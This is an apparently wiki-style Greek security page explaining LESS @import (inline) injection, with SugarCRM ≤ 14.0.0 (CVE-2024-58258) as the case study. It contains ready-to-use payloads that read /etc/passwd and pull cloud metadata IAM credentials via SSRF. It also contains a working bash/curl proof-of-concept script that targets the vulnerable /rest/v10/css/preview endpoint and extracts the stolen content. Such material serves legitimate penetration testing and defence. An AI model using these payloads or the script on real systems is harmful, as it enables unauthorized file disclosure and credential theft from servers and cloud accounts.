## LESS Code Injection που οδηγεί σε SSRF & Local File Read

LESS είναι ένας δημοφιλής CSS pre-processor που προσθέτει μεταβλητές, mixins, functions και την ισχυρή `@import` directive. Κατά τη μεταγλώττιση, ο μηχανισμός LESS θα ανακτήσει τους πόρους που αναφέρονται στις δηλώσεις `@import` και θα ενσωματώσει ("inline") τα περιεχόμενά τους στο παραγόμενο CSS όταν χρησιμοποιείται η επιλογή `(inline)`.

Όταν μια εφαρμογή συνενώνει είσοδο που ελέγχεται από τον χρήστη μέσα σε μια συμβολοσειρά που αργότερα αναλύεται από τον LESS compiler, ένας επιτιθέμενος μπορεί να εισάγει αυθαίρετο LESS code. Καταχρώμενος το `@import (inline)` ο επιτιθέμενος μπορεί να αναγκάσει τον server να ανακτήσει:

* Τοπικά αρχεία μέσω του πρωτοκόλλου `file://` (information disclosure / Local File Inclusion).
* Απομακρυσμένους πόρους σε εσωτερικά δίκτυα ή cloud metadata services (SSRF).

Αυτή η τεχνική έχει εμφανιστεί σε πραγματικά προϊόντα όπως το **SugarCRM ≤ 14.0.0** (endpoint `/rest/v10/css/preview`).

### Εκμετάλλευση

1. Εντοπίστε μια παράμετρο που ενσωματώνεται άμεσα μέσα σε μια συμβολοσειρά stylesheet που επεξεργάζεται ο LESS engine (π.χ. `?lm=` στο SugarCRM).
2. Κλείστε την τρέχουσα δήλωση και εγχύστε νέες οδηγίες. Τα πιο κοινά primitives είναι:
* `;`  – τερματίζει την προηγούμενη δήλωση.
* `}`  – κλείνει το προηγούμενο block (αν απαιτείται).
3. Χρησιμοποιήστε `@import (inline) '<URL>';` για να διαβάσετε αυθαίρετους πόρους.
4. Προαιρετικά εγχύστε ένα **marker** (`data:` URI) μετά το import για να διευκολύνετε την εξαγωγή του ανακτηθέντος περιεχομένου από το compiled CSS.

#### Local File Read
```
1; @import (inline) 'file:///etc/passwd';
@import (inline) 'data:text/plain,@@END@@'; //
```
Το περιεχόμενο του `/etc/passwd` θα εμφανιστεί στην HTTP απόκριση ακριβώς πριν από τον δείκτη `@@END@@`.

#### SSRF – Cloud Metadata
```
1; @import (inline) "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
@import (inline) 'data:text/plain,@@END@@'; //
```
#### Αυτοματοποιημένο PoC (παράδειγμα SugarCRM)
```bash
#!/usr/bin/env bash
# Usage: ./exploit.sh http://target/sugarcrm/ /etc/passwd

TARGET="$1"        # Base URL of SugarCRM instance
RESOURCE="$2"      # file:// path or URL to fetch

INJ=$(python -c "import urllib.parse,sys;print(urllib.parse.quote_plus(\"1; @import (inline) '$RESOURCE'; @import (inline) 'data:text/plain,@@END@@';//\"))")

curl -sk "${TARGET}rest/v10/css/preview?baseUrl=1&lm=${INJ}" | \
sed -n 's/.*@@END@@\(.*\)/\1/p'
```
### Πραγματικές Περιπτώσεις

| Προϊόν | Ευπαθές Endpoint | Επίπτωση |
|---------|--------------------|--------|
| SugarCRM ≤ 14.0.0 | `/rest/v10/css/preview?lm=` | Μη αυθεντικοποιημένο SSRF και ανάγνωση τοπικών αρχείων |

### Αναφορές

* [SugarCRM ≤ 14.0.0 (css/preview) LESS Code Injection Vulnerability](https://karmainsecurity.com/KIS-2025-04)
* [SugarCRM Security Advisory SA-2024-059](https://support.sugarcrm.com/resources/security/sugarcrm-sa-2024-059/)
* [CVE-2024-58258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-58258)
